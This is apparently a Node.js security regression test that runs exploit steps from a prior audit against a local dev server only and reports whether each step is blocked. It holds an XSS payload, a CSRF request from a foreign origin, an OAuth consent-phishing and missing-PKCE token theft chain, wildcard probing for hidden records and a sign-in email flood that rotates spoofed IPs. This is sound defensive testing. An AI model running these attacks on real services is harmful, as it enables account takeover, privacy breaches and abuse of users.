#!/usr/bin/env node
/**
 * Security probe against a LOCAL `wrangler dev` (never production — it POSTs).
 * Same exploit steps as the 2026-10-28 audit's tools/security-local-probe.mjs,
 * but each step reports BLOCKED / OPEN instead of crashing once a fix lands,
 * plus the checks for headers, PKCE, scopes and the sign-in rate limit.
 *
 *   npm run build
 *   npx wrangler d1 migrations apply open-human-design --local
 *   npx wrangler dev --local --port 8796 --local-upstream 127.0.0.1:8796 > /tmp/wr.log
 *   node tests/security-probe.mjs http://127.0.0.1:8796 /tmp/wr.log
 *
 * Needs a .dev.vars with any BETTER_AUTH_SECRET. Magic links are read from the
 * local send_email binding's files, whose paths wrangler prints to its log.
 * Exit code = number of steps still OPEN.
 */
import { readFileSync } from 'node:fs';
import { createHash, randomBytes } from 'node:crypto';

const B = process.argv[2] || 'http://127.0.0.1:8796';
const WLOG = process.argv[3];
if (!/^http:\/\/(127\.0\.0\.1|localhost)[:/]/.test(B + '/')) { console.error('local targets only'); process.exit(2); }
if (!WLOG) { console.error('usage: security-probe.mjs BASE WRANGLER_LOG'); process.exit(2); }

const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const ip = () => `192.0.2.${Math.floor(Math.random() * 250) + 1}`;
const b64u = (buf) => buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
let open = 0;
function step(name, blocked, detail) {
  if (!blocked) open++;
  console.log(`\n## ${name}\n${blocked ? 'BLOCKED' : 'OPEN   '}  ${typeof detail === 'string' ? detail : JSON.stringify(detail)}`);
}
const info = (name, detail) => console.log(`\n## ${name}\ninfo     ${typeof detail === 'string' ? detail : JSON.stringify(detail)}`);

async function magicLink(email, callbackURL, headers = {}) {
  const before = readFileSync(WLOG, 'utf8').length;
  const r = await fetch(`${B}/api/auth/sign-in/magic-link`, {
    method: 'POST', headers: { 'content-type': 'application/json', ...headers },
    body: JSON.stringify({ email, callbackURL })
  });
  if (r.status !== 200) return { status: r.status };
  for (let i = 0; i < 40; i++) {
    await sleep(150);
    const m = readFileSync(WLOG, 'utf8').slice(before).match(/Text: (\S+\.txt)/);
    if (m) return { status: 200, mail: readFileSync(m[1], 'utf8') };
  }
  throw new Error('magic link email not found in wrangler log');
}

async function signIn(email) {
  let ml = await magicLink(email, '/', { 'x-forwarded-for': ip() });
  if (ml.status === 429) { await sleep(61_000); ml = await magicLink(email, '/'); }
  const token = ml.mail.match(/token=([A-Za-z0-9_-]+)/)[1];
  const v = await fetch(`${B}/api/auth/magic-link/verify?token=${token}&callbackURL=%2F`, { redirect: 'manual' });
  const setCookies = v.headers.getSetCookie();
  return { cookie: setCookies.map(c => c.split(';')[0]).join('; '), attrs: setCookies.map(c => c.replace(/=[^;]+/, '=<redacted>')) };
}

async function sync(cookie, body, extra = {}) {
  const r = await fetch(`${B}/api/sync`, { method: 'POST', headers: { 'content-type': 'application/json', origin: B, cookie, ...extra }, body: typeof body === 'string' ? body : JSON.stringify(body) });
  return { status: r.status, json: await r.json().catch(() => null) };
}

async function mcp(token, name, args) {
  const r = await fetch(`${B}/mcp`, {
    method: 'POST',
    headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json', accept: 'application/json, text/event-stream' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name, arguments: args } })
  });
  const j = await r.json().catch(() => null);
  return { status: r.status, isError: !!j?.result?.isError, text: j?.result?.content?.map(c => c.text).join(' | ')?.slice(0, 300) ?? JSON.stringify(j)?.slice(0, 200) };
}

// --- 0. headers --------------------------------------------------------------
const want = ['content-security-policy', 'strict-transport-security', 'x-frame-options', 'x-content-type-options', 'referrer-policy'];
const missing = {};
for (const p of ['/', '/gate/1', '/authorize', '/auth/verify', '/api/auth/get-session', '/mcp', '/.well-known/oauth-authorization-server', '/robots.txt']) {
  const r = await fetch(B + p, { redirect: 'manual' });
  const m = want.filter(h => !r.headers.get(h));
  if (m.length) missing[p] = m;
}
step('0. security headers on every route', !Object.keys(missing).length, Object.keys(missing).length ? { missing } : `all of ${want.join(', ')} on 8 routes`);

// --- 1. session --------------------------------------------------------------
const now = new Date().toISOString();
const victim = await signIn(`victim+${Date.now()}@example.test`);
info('1. session cookie (local origin is http, so no Secure here; prod http now 301s first)', victim.attrs);

// --- 2-4. /api/sync input validation ----------------------------------------
await sync(victim.cookie, { changes: [
  { id: 'p-mom', name: 'Mom', birthDate: '1960-03-01', birthTime: '08:00', aiAccess: true, updatedAt: now },
  { id: 'p-secret', name: 'Secret Ex', birthDate: '1988-07-07', birthTime: '21:15', aiAccess: false, updatedAt: now },
  { id: 'p-gone', name: 'Old Friend', birthDate: '1970-01-02', birthTime: '10:00', aiAccess: true, updatedAt: now }
] });
const big = 'B'.repeat(400_000);
{
  const r = await sync(victim.cookie, { changes: [{ id: 'tomb-1', deletedAt: 'x', name: big, birthDate: 'not-a-date', location: { name: big, lat: '<svg onload=alert(1)>' } }] });
  const t = r.json?.changes?.find(c => c.id === 'tomb-1');
  step('2a. audit payload: 400k-char tombstone', !t, t ? { nameLen: t.name?.length, lat: t.location?.lat } : `status ${r.status}, not stored`);
}
{
  const r = await sync(victim.cookie, { changes: [{ id: 'tomb-2', deletedAt: now, updatedAt: now, name: 'N'.repeat(5000), birthDate: 'not-a-date', location: { name: 'L'.repeat(5000), lat: '<svg onload=alert(1)>' } }] });
  const t = r.json?.changes?.find(c => c.id === 'tomb-2');
  step('2b. junk tombstone for an id the server never had', !t, t ? { nameLen: t.name?.length, birthDate: t.birthDate, lat: t.location?.lat } : `status ${r.status}, not stored`);
}
{
  const flood = Array.from({ length: 200 }, (_, i) => ({ id: `flood-${i}`, deletedAt: now, updatedAt: now }));
  const r = await sync(victim.cookie, { changes: flood });
  const stored = (r.json?.changes || []).filter(c => c.id.startsWith('flood-')).length;
  step('2c. 200 new tombstone ids in one request (fills D1 past the cap)', stored === 0, `${stored} stored`);
}
{
  const r = await sync(victim.cookie, { changes: [{ id: 'p-gone', deletedAt: new Date(Date.now() + 1000).toISOString(), updatedAt: new Date(Date.now() + 1000).toISOString() }] });
  const t = r.json?.changes?.find(c => c.id === 'p-gone');
  step('2d. a real delete keeps no birth data on the server', t?.deletedAt && !t.name && !t.birthDate, t || r);
}
{
  const r = await sync(victim.cookie, { changes: [{ id: 'p-long', name: 'x', birthDate: '1990-01-01', birthTime: '12:00', location: { name: 'L'.repeat(100_000), iana: 'I'.repeat(1000), lat: 'NaN-string' }, updatedAt: now }] });
  const l = r.json?.changes?.find(c => c.id === 'p-long');
  step('3. live record with unvalidated location.*', !l, l ? { locNameLen: l.location?.name?.length, ianaLen: l.location?.iana?.length, lat: l.location?.lat } : `status ${r.status}, not stored`);
}
{
  const r = await sync(victim.cookie, '{"changes":[]}', { 'content-type': 'text/plain', origin: 'https://evil.example' });
  step('4. /api/sync accepts text/plain + foreign Origin (CSRF)', r.status >= 400, `status ${r.status}`);
}

// --- 5-9. OAuth consent phishing ---------------------------------------------
const reg = await fetch(`${B}/oauth/register`, { method: 'POST', headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ client_name: 'Claude', redirect_uris: ['https://evil.example/cb'], token_endpoint_auth_method: 'none' }) });
const client = await reg.json();
info('5. anonymous dynamic client registration (open by design for MCP clients)', { status: reg.status, client_name: client.client_name, redirect_uris: client.redirect_uris });

const base = { response_type: 'code', client_id: client.client_id, redirect_uri: 'https://evil.example/cb', scope: 'charts:read', state: 's1' };
const visible = (html) => html.replace(/<script[\s\S]*?<\/script>/g, '').replace(/<input[^>]*>/g, '').replace(/<[^>]+>/g, ' ');
{
  const page = await fetch(`${B}/authorize?${new URLSearchParams(base)}`, { headers: { cookie: victim.cookie } });
  const html = await page.text();
  step('6a. consent page for a request with no PKCE', !/name="qs"/.test(html), { status: page.status, h1: html.match(/<h1>(.*?)<\/h1>/)?.[1] });
  const plain = await fetch(`${B}/authorize?${new URLSearchParams({ ...base, code_challenge: 'x'.repeat(43), code_challenge_method: 'plain' })}`, { headers: { cookie: victim.cookie } });
  step('6b. consent page for PKCE "plain"', !/name="qs"/.test(await plain.text()), `status ${plain.status}`);
}
const verifier = b64u(randomBytes(32));
const qs = '?' + new URLSearchParams({ ...base, code_challenge: b64u(createHash('sha256').update(verifier).digest()), code_challenge_method: 'S256' });
{
  const page = await fetch(`${B}/authorize${qs}`, { headers: { cookie: victim.cookie } });
  const html = await page.text();
  const text = visible(html);
  step('6c. consent page (S256) shows the redirect host', text.includes('evil.example'), { h1: html.match(/<h1>(.*?)<\/h1>/)?.[1], hostShown: text.includes('evil.example'), warning: /not verified/.test(text) });
}
const post = (headers) => fetch(`${B}/authorize`, { method: 'POST', redirect: 'manual', headers: { cookie: victim.cookie, 'content-type': 'application/x-www-form-urlencoded', ...headers }, body: new URLSearchParams({ qs }) });
const foreign = await post({ origin: 'https://evil.example' });
const noOrigin = await post({});
step('7. POST /authorize with no Origin issues a code', noOrigin.status !== 302, { foreign: foreign.status, noOrigin: noOrigin.status });

// The audit's exploit: no PKCE at all. The victim clicks Connect (same-origin
// POST, as a real browser sends it); the attacker exchanges with no verifier.
const ex = (body) => fetch(`${B}/oauth/token`, { method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({ grant_type: 'authorization_code', client_id: client.client_id, redirect_uri: 'https://evil.example/cb', ...body }) });
const codeFrom = (r) => new URL(r.headers.get('location') || 'http://x/').searchParams.get('code');
let token = null;
{
  const click = await fetch(`${B}/authorize`, { method: 'POST', redirect: 'manual', headers: { cookie: victim.cookie, origin: B, 'content-type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ qs: '?' + new URLSearchParams(base) }) });
  const code = codeFrom(click);
  let detail = { consentPost: click.status, codeIssued: !!code };
  if (code) {
    const r = await ex({ code });
    const j = await r.json();
    token = j.access_token;
    detail = { ...detail, token: r.status, scope: j.scope, expires_in: j.expires_in, refresh: !!j.refresh_token };
  }
  step('8. no-PKCE request: Connect → code → token without a verifier', !token, detail);
}
if (!token) {
  // An S256 code exchanged with the verifier left out. (Skipped when step 8
  // already got a token: a second grant for the same client revokes it.)
  const click = await post({ origin: B });
  const code = codeFrom(click);
  info('8b. victim clicks Connect on the S256 request anyway', { status: click.status, redirectedTo: (click.headers.get('location') || '').replace(/code=[^&]+/, 'code=<redacted>') });
  if (code) {
    const r = await ex({ code });
    const j = await r.json();
    step('8c. S256 code exchanged with the verifier left out', !j.access_token, { status: r.status, error: j.error });
    if (!token) token = (await (await ex({ code, code_verifier: verifier })).json()).access_token; // already spent if 8c was open
  }
}
if (!token) {
  // Last resort for the MCP steps: a fresh S256 grant, exchanged properly.
  const click = await post({ origin: B });
  const code = codeFrom(click);
  if (code) token = (await (await ex({ code, code_verifier: verifier })).json()).access_token;
}
if (token) {
  info('9a. list_people with a charts:read token (allowed by that scope)', await mcp(token, 'list_people', {}));
  const wild = await mcp(token, 'compute_chart', { birth: 'Sec%' });
  const hidden = await mcp(token, 'compute_chart', { birth: 'Secret Ex' });
  const nobody = await mcp(token, 'compute_chart', { birth: 'Nobody Here' });
  const same = (a, an, b, bn) => a.text.split(an).join('') === b.text.split(bn).join('');
  step('9b. LIKE wildcard reveals a hidden person', !/is saved|AI access is off/.test(wild.text), wild.text);
  step('9b2. a hidden person\'s exact name answers differently from a missing one', same(hidden, 'Secret Ex', nobody, 'Nobody Here'), hidden.text);
  const del = await mcp(token, 'delete_person', { name: 'Mom' });
  step('9c. delete_person with a read-only (charts:read) token', del.isError || !/deleted/.test(del.text), del.text);
} else {
  info('9. no token obtained', 'skipped MCP steps');
}

// --- 10. sign-in email rate limit --------------------------------------------
await sleep(61_000); // fresh window
const statuses = [];
for (let i = 0; i < 8; i++) {
  const r = await fetch(`${B}/api/auth/sign-in/magic-link`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-forwarded-for': ip() }, body: JSON.stringify({ email: 'bomb-target@example.test', callbackURL: '/' }) });
  statuses.push(r.status);
}
step('10. sign-in emails to one address, rotating X-Forwarded-For', statuses.includes(429), statuses.join(' '));

// --- 11-12. privacy quick wins -------------------------------------------------
{
  const share = '/?d=1985-01-13&t=14:30&tz=-5&n=Sam&place=New+York&lat=40.712776&lon=-74.005974&iana=America/New_York';
  const r = await fetch(B + share);
  const html = await r.text();
  const ogUrl = html.match(/property="og:url" content="([^"]*)"/)?.[1] || '';
  const leaks = ['lat=', 'lon=', 'place=', 'iana='].filter(k => ogUrl.includes(k));
  step('11a. share page og:url repeats place + coordinates', !leaks.length, ogUrl);
  step('11b. share page can be indexed', /<meta name="robots" content="noindex">/.test(html) && /noindex/.test(r.headers.get('x-robots-tag') || ''),
    { meta: /name="robots"/.test(html), xRobotsTag: r.headers.get('x-robots-tag') });
}
{
  const hits = [];
  for (const p of ['/', '/gate/1']) if (/fonts\.(googleapis|gstatic)\.com/.test(await (await fetch(B + p)).text())) hits.push(p);
  step('12. pages load Google Fonts (visitor IP to Google)', !hits.length, hits.length ? hits : 'none on / and /gate/1');
}

console.log(`\n${open} step(s) OPEN`);
process.exit(open);
